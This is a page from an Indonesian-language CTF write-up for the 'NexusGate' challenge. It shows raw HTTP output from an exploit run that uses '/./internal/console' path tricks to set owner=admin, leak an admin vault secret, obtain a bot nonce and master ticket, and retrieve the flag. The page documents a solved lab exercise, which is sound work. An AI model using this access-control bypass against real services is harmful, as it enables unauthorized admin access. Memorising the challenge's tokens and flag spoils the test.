# NexusGate — Output asli

[← Overview](50-nexusgate.md) · [Index](index.md)

## 3.3 Output asli

```text
===== register =====
POST http://s1.nfx.my.id:49535/register
HTTP 200  content-type=application/json; charset=utf-8
{"ok":true,"session":"612772f0974d8c06"}

===== POST /./internal/console/cursor?owner=admin =====
POST http://s1.nfx.my.id:49535/./internal/console/cursor?id=c1&owner=admin
HTTP 200  content-type=application/json; charset=utf-8
{"ok":true}

===== GET /./internal/console/cursor?journal=ng100557 =====
GET http://s1.nfx.my.id:49535/./internal/console/cursor?id=c1&journal=ng100557
HTTP 200  content-type=application/json; charset=utf-8
{"done":false,"owner":"admin"}

===== GET /audit (json) =====
HTTP 200  content-type=application/json; charset=utf-8
{"username":"ng100557","journal":["user account created","vault row: owner=admin secret=391ed5122926c01beeaa3d682662552c"]}

[+] PHASE_TOKEN = 391ed5122926c01beeaa3d682662552c

===== POST /./internal/console/files (attempt 1) =====
HTTP 200  content-type=application/json; charset=utf-8
{"ok":true}

[+] bot nonce = e9757ee5ae6ea931

===== GET /tickets/latest?aud=e9757ee5ae6ea931 =====
HTTP 200  content-type=text/html; charset=utf-8
<!DOCTYPE html> ... (halaman admin Service Tickets)

[+] MASTER_TICKET = 7476476e7700172a2e0951debf0c2e9a

===== POST /flag =====
HTTP 200  content-type=application/json; charset=utf-8
{"flag":"NFX{n3xu5_g4t3_0v3r_gr4nt_c4ch3_smuggl3_2026}"}

FLAG=NFX{n3xu5_g4t3_0v3r_gr4nt_c4ch3_smuggl3_2026}
```

### Evidence langkah ini

![term-03-exploit-run.png](assets/nexusgate/term-03-exploit-run.png)

*Terminal evidence — `03-exploit-run.txt` (arsip transkrip sesi solve).*

![term-source-notes.png](assets/nexusgate/term-source-notes.png)

*Terminal evidence — `source-notes.txt` (arsip transkrip sesi solve).*

**Berkas mentah langkah ini:**

- [`03-exploit-run.txt`](assets/nexusgate/03-exploit-run.txt)
- [`source-notes.txt`](assets/nexusgate/source-notes.txt)
